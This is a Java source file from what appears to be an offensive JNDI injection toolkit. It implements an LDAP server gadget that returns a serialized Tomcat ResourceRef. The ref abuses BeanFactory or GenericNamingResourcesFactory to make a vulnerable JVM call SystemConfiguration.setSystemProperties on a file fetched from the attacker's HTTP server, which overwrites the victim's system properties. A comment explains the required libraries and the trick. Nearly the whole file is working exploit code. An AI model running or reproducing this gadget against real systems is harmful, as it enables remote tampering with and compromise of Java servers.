package net.roboterh.injector.gadgets;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.utils.GadgetUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/*
    Tomcat CommonsConfiguration Way:
    Requirement:
        Tomcat/tomcat-jdbc.jar and CommonsConfiguration/CommonsConfiguration2 in classpath
    Explanation:
        The class named `org.apache.commons.configuration.SystemConfiguration` or `org.apache.commons.configuration2.SystemConfiguration`
            is an eligible beanClass. And the method of beanClass named `setSystemProperties` will load a local or remote file
            which content consists of key-value separated by an equal sign. Particularly, the systematic properties will be covered
            by these attributions.

        In another way, there is a factory named `org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory`
            in tomcat-jdbc.jar. In the getObjectInstance method of this factory, it will add `set` to key directly. Such
            as the input is systemProperties, and the output is setSystemProperties.
 */
public class TomcatCommonsConfiguration implements LDAPService{
    private static final Logger logger = LogManager.getLogger(TomcatCommonsConfiguration.class);

    private String factory;
    private String beanClass;
    private String fileName;
    private String remoteUrl;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            logger.info(String.format("Send LDAP result for %s using TomcatCommonsConfiguration Way ...", baseDN));

            // create ResourceRef
            ResourceRef resourceRef = new ResourceRef(beanClass, null, "", "",
                    true, factory, null);
            if (factory.equalsIgnoreCase("org.apache.naming.factory.BeanFactory")) {
                resourceRef.add(new StringRefAddr("forceString", "x=setSystemProperties"));
                resourceRef.add(new StringRefAddr("x", remoteUrl));
            } else if (factory.equalsIgnoreCase("org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory")) {
                resourceRef.add(new StringRefAddr("systemProperties", remoteUrl));
            }

            Entry entry = new Entry(baseDN);
            entry.addAttribute("javaClassName", "java.lang.Class");
            entry.addAttribute("javaSerializedData", GadgetUtils.serialize(resourceRef));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e){
            logger.info(e.getMessage());
        }
    }

    @Override
    public void argsHandler(String baseDN) {
        int firstIndex = baseDN.indexOf("/");
        int secondIndex = baseDN.indexOf("/", firstIndex + 1);
        int thirdIndex = baseDN.indexOf("/", secondIndex + 1);

        // obtain the factory
        switch (baseDN.substring(firstIndex + 1, secondIndex)) {
            case "BeanFactory":
                factory = "org.apache.naming.factory.BeanFactory";
                break;
            case "GenericNamingResourcesFactory":
                factory = "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory";
                break;
        }

        // obtain the beanClass
        switch (baseDN.substring(secondIndex + 1, thirdIndex)) {
            case "configuration":
                beanClass = "org.apache.commons.configuration.SystemConfiguration";
                break;
            case "configuration2":
                beanClass = "org.apache.commons.configuration2.SystemConfiguration";
                break;
        }

        // obtain the fileName
        fileName = baseDN.substring(thirdIndex + 1);

        logger.info(String.format("Received baseClass is %s, and the fileName is %s ...", beanClass, fileName));
    }

    @Override
    public void generateHandler() {
        remoteUrl = HTTPServer.codeBase + fileName;
    }
}
